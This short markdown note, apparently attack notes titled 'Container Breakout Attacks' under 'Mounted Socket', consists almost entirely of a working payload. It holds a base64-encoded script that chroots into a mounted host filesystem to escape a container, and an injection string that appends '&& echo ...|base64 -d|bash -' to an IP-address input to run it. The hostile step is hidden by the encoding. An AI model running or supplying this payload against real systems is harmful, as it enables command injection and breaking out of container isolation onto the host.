# Container Breakout Attacks

## Mounted Socket

Base64 encoded string: `IyEvYmluL2Jhc2gKY2QgLwpjZCBob3N0LwpjaHJvb3QgLiAvdXNyL2Jpbi9zaCA8PCAiRU9UIgpwd2QKZ3JlcCBkb2NrZXIgL3Byb2MvMS9jZ3JvdXAgfCB3YyAtbApwcwpFT1QKY2QgLi4=`

Attack: 
`127.0.0.1 && echo "IyEvYmluL2Jhc2gKY2QgLwpjZCBob3N0LwpjaHJvb3QgLiAvdXNyL2Jpbi9zaCA8PCAiRU9UIgpwd2QKZ3JlcCBkb2NrZXIgL3Byb2MvMS9jZ3JvdXAgfCB3YyAtbApwcwpFT1QKY2QgLi4="|base64 -d |bash -`